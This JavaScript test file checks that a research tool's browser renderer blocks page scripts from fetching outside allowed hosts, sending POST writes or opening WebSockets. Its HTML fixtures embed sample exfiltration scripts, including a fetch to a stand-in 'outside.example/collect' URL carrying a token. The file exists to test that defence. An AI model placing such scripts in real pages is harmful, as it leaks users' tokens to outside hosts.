import test from "node:test"
import assert from "node:assert/strict"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { SourceFetcher } from "../scripts/research/fetch.mjs"
import { renderDocument } from "../scripts/research/browser.mjs"

test("browser-rendered source scripts cannot fetch outside the source host policy", async (t) => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "garden-browser-policy-")))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const previousPython = process.env.RESEARCH_PYTHON
  process.env.RESEARCH_PYTHON = path.resolve(".local/research/local-ai/runtime/venv/bin/python")
  t.after(() => {
    if (previousPython === undefined) delete process.env.RESEARCH_PYTHON
    else process.env.RESEARCH_PYTHON = previousPython
  })

  const articleURL = "https://publisher.example/article/1"
  const hostileURL = "https://outside.example/collect?token=secret"
  const writeURL = "https://publisher.example/state-change"
  const requests = []
  const fetcher = new SourceFetcher(root, {
    interval_ms: 0,
    resolve: async () => [{ address: "1.1.1.1", family: 4 }],
    transport: async (url) => {
      const value = url.toString()
      requests.push(value)
      if (value.endsWith("/robots.txt"))
        return {
          status: 200,
          headers: { "content-type": "text/plain" },
          body: Buffer.from("User-agent: *\nAllow: /\n"),
        }
      if (value === articleURL)
        return {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
          body: Buffer.from(
            `<!doctype html><html><head><title>Source</title></head><body><p>Source text</p><script>fetch(${JSON.stringify(hostileURL)}).catch(() => {});fetch(${JSON.stringify(writeURL)},{method:"POST",body:"token=secret"}).catch(() => {})</script></body></html>`,
          ),
        }
      throw new Error(`Unexpected outbound fetch: ${value}`)
    },
  })
  const source = await fetcher.fetch(articleURL, { allowed_hosts: ["publisher.example"] })
  assert.equal(source.fetch_status, "captured")

  await assert.rejects(
    renderDocument(root, fetcher, source, {
      allowed_hosts: ["publisher.example"],
      timeout_ms: 10000,
    }),
    /Host outside channel policy/,
  )
  assert.deepEqual(
    requests.filter((url) => url.includes("outside.example") || url === writeURL),
    [],
    "external hosts and non-GET requests must be stopped before parent source acquisition",
  )
})

test("browser-rendered source scripts cannot send writes or open WebSockets", async (t) => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "garden-browser-methods-")))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const previousPython = process.env.RESEARCH_PYTHON
  process.env.RESEARCH_PYTHON = path.resolve(".local/research/local-ai/runtime/venv/bin/python")
  t.after(() => {
    if (previousPython === undefined) delete process.env.RESEARCH_PYTHON
    else process.env.RESEARCH_PYTHON = previousPython
  })

  const articleURL = "https://publisher.example/article/2"
  const writeURL = "https://publisher.example/state-change"
  const socketURL = "wss://publisher.example/live"
  const requests = []
  const fetcher = new SourceFetcher(root, {
    interval_ms: 0,
    resolve: async () => [{ address: "1.1.1.1", family: 4 }],
    transport: async (url) => {
      const value = url.toString()
      requests.push(value)
      if (value.endsWith("/robots.txt"))
        return {
          status: 200,
          headers: { "content-type": "text/plain" },
          body: Buffer.from("User-agent: *\nAllow: /\n"),
        }
      if (value === articleURL)
        return {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
          body: Buffer.from(
            `<!doctype html><html><body><p>Source text</p><script>fetch(${JSON.stringify(writeURL)},{method:"POST",body:"token=secret"}).catch(() => {});new WebSocket(${JSON.stringify(socketURL)})</script></body></html>`,
          ),
        }
      throw new Error(`Unexpected outbound fetch: ${value}`)
    },
  })
  const source = await fetcher.fetch(articleURL, { allowed_hosts: ["publisher.example"] })
  const rendered = await renderDocument(root, fetcher, source, {
    allowed_hosts: ["publisher.example"],
    timeout_ms: 10000,
  })

  assert.equal(rendered.fetch_status, "captured")
  assert.equal(requests.includes(writeURL), false, "same-host POST must not reach source transport")
  assert.equal(requests.includes(socketURL), false, "WebSocket must not reach source transport")
  assert.equal(requests.filter((url) => url === articleURL).length, 2)
})
